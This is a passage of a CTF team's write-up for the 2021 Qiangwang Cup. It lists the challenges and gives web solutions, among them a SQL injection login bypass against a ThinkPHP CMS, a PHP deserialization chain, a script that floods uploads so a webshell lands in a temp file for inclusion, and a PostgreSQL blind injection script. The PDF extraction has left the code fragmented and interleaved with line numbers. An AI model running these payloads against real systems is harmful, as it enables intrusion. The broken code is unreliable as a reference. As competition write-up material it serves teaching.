2021 强⽹杯 Writeup - Nu1L
2021 强⽹杯 Writeup - Nu1L
Web
Hard_Penetration
pop_master
WhereIsUWebShell
EasySQL
[强⽹先锋]赌徒
Hard_APT_jeesite
[强⽹先锋]寻宝
EasyWeb
EasyXSS
Misc
BlueTeaming
ISO1995
签到
CipherMan
ExtremelySlow
问卷题
EzTime
Pwn
baby_diary
EzCloud
notebook
[强⽹先锋]orw
[强⽹先锋]no_output
babypwn
pipeline
[强⽹先锋]shellcode
Reverse
ezmath
unicorn_like_a_pro
LongTimeAgo
Crypto
BabyAEG
guess_game
Web
Hard_Penetration
shiro rce，注⼊内存⻢，发现 8005 端⼝还有⼀个 php 站点，当前⽤户为 ctf 没有⾼权限，于是审计 php 
站点，发现为 TP3.1.3 开发的 cms，审计后发现后台存在注⼊，同时模板处可以任意⽂件包含：
登录后台 payload 如下：
在 tmp ⽬录创建 1.html，内容为：
pop_master
username[0]=exp&username[1]=>'Z' )) union select 
1,'admin','',1,5,6,7,8,9,10,11,12,13,14,15,16-- a&yzm=juik
1
" + subnode.name[1:] + "= new " + 
functions[pop_chain[i+1]].name + "();")
                print("}")
    print("}")
    i += 1
    if i  == len(pop_chain):
        break
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
qwb) echo file_get_contents($this->qwb);
    }
}
$a=new myclass();
$b=new Hello();
$b->qwb="e2a7106f1cc8bb1e1318df70aa0a3540.php";
$a->test=$b;
echo serialize($a);
1
2
3
4
5
6
7
8
9
10
11
12
13
14
去掉最后⼤括号即可
读到第⼆层的源码：
 0, 'y' => 0, 'width' => $size, 
'height' => $size]);
    if ($second !== FALSE) {
        imagepng($second, $file);
        imagedestroy($second);//销毁，清内存
    }
    imagedestroy($first);
}
function GenFiles(){
    $files = array();
    $str = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    $len=strlen($str)-1;
    for($i=0;$i
40
41
42
43
44
45
46
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
#!/usr/bin/env python
# -*- coding: utf-8 -*-
import requests
import string
1
2
3
4
5
翻了很久没发现 flag，最后查找 root ⽤户的信息，发
现 /usr/bin/ed471efd0577be6357bb94d6R3@dF1aG 
/l1b/af893aaa/3056545a/5f1ad7d8/50557e0f/99cddcda/Fl444ggg7063aa0e ，即可拿到 flag
import itertools,re
charset = string.digits + string.letters
base_url = "http://eci-xxxxxxxx.cloudeci1.ichunqiu.com"
def upload_file_to_include(url, file_content):
    files = {'file': ('1.png', open('1.png','rb'), 'image/png')}
    try:
        response = requests.post(url, files=files)
    except Exception as e:
        print e
def generate_tmp_files():
    webshell_content = ''.encode(
        "base64").strip().encode("base64").strip().encode("base64").strip()
    file_content = '' % (
        webshell_content)
    phpinfo_url = "%s/e2a7106f1cc8bb1e1318df70aa0a3540.php?c9eb959c-28fb-
4e43-91a4-979f5c63e05f=php://filter/string.strip_tags/resource=./404.html" % 
(
        base_url)
    length = 6
    times = len(charset) ** (length / 2)
    for i in xrange(times):
        print "[+] %d / %d" % (i, times)
        upload_file_to_include(phpinfo_url, file_content)
def main():
    generate_tmp_files()
if __name__ == "__main__":
    main()
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
EasySQL
过程
1. || 判断出来是 pgsql
2. 盲注出来⽤户是 postgres
3. ⽀持堆叠注⼊
4. pg ⽀持 create function 函数，然后可以通过 execute 去执⾏⼀个 statement
5. node 的那个客户端是事物执⾏的，所以要先 COMMIT， 然后让他报错，省得⾛到后⾯没有 try catch 
程序崩溃导致容器崩溃
import requests
import string
def inj(SQL):
    url = "http://eci-2zehg7ugvk09tek5c710.cloudeci1.ichunqiu.com:8888/"
    data = {
        "username[]": 'admin',
        "password": '\' and 1=(case when({}) then 1 else cast((select 
\'ddddc\') as numeric) end) -- -'.format(SQL),
    }
    resp = requests.post(url, data=data)
    print(data)
    content = resp.text
    print(content)
    return content
def bin_inj(SQL,length = False):
    bottom = 0
    upper = 256
    while bottom < upper:
        C = (bottom, upper)
        sql = SQL+" between {} and {}".format(int(bottom), int(upper))
        # print(C)
        res = inj(sql)
        # print(res)
        if "Password Error!" in res:
            # print("USE C1")
            C_L = (int(((bottom+upper) / 2)+1), int(upper))
            bottom, upper = (bottom, int((bottom + upper)/ 2) )
1
2
3
4
5
6
7
8
9
10
11
12